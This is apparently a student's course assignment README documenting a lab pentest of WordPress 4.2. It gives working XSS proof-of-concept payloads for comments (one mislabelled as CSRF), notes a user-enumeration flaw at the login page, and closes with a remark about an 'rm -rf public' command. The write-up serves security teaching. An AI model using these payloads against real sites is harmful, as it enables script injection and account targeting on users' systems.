# Cybersecurity_Week_7-8
Pentesting for Wordpress 4.2 for Cybersecurity Week 7 &amp; 8 Assignment

## **1.Persisten CSRF**    
-In reply/comment post: 
  `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA...[64 KB]..AAA'></a>`


Vulnerability: CSRF  
Version: 4.2  
Source:[Code](https://www.exploit-db.com/exploits/36844)  
![Persisten CSRF](https://github.com/atsui4688/Cybersecurity_Week_7-8/blob/master/Persisten%20CSRF.gif)  

## **2.User Enumeration**  
-At the login page, WordPress version 4.2 will notify you if a username exists when you attempt to login  
Vulnerability: User Enumeration  
Version: 4.2  
![User Enumeration](https://github.com/atsui4688/Cybersecurity_Week_7-8/blob/master/User%20Enumeration.gif)  

## **3.Authenticated Shortcode Tags XSS**  
-In a comment/reply: `<a href = "XSS" onmouseover=alert(1) rel="nofollow">CLICK ME!</a>`  
-Hover over the link in the comment.
  
Vulnerability: XSS  
Version: 4.2  
Source:[Code](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)  
![Authenticated Shortcode Tags XSS](https://github.com/atsui4688/Cybersecurity_Week_7-8/blob/master/Authenticated%20Shortcode%20Tags%20XSS.gif)    

## **Notes**  
The `rm -rf public` command does not work on Windows 10 for me
